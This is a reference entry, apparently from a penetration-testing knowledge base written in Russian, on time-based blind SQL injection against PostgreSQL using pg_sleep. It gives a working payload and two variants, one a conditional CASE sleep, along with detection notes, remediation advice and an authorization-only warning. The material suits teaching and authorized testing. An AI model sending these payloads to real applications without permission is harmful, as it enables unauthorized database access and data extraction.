---
id: sqli-postgresql-boolean-sleep
title: "PostgreSQL: time-based blind через pg_sleep"
type: sqli
target: postgresql
category: web
difficulty: intermediate
bypass: none
tags: [sqli, postgresql, blind, time-based]
tested_on: ["PostgreSQL 15"]
success_rate: 0.75
risk: low
cwe: "CWE-89"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/SQL_Injection"
  - "https://portswigger.net/web-security/sql-injection"
graph:
  - target: "sqli"
    type: instance_of
---

# PostgreSQL: time-based blind через pg_sleep

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
' AND (SELECT pg_sleep(5)) IS NOT NULL --
```

## Explanation

`pg_sleep(N)` приостанавливает backend-процесс на N секунд. Обёртка в подзапрос
с `IS NOT NULL` нужна, чтобы выражение было корректным в позиции условия.
Как и в MySQL, время становится каналом передачи данных при полностью «слепой» инъекции.

## Detection

Baseline против `pg_sleep(5)`: стабильная задержка около 5 с. Учтите, что `pg_sleep`
выполняется на каждой строке — задержка может умножаться.

## Remediation

- Параметризация.
- `statement_timeout` на уровне роли/БД (например, 5 с) — резко удорожает
  blind-эксплуатацию.
- Rate limiting.

## Variants

```
'; SELECT pg_sleep(5) --
```

```
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NOT NULL --
```
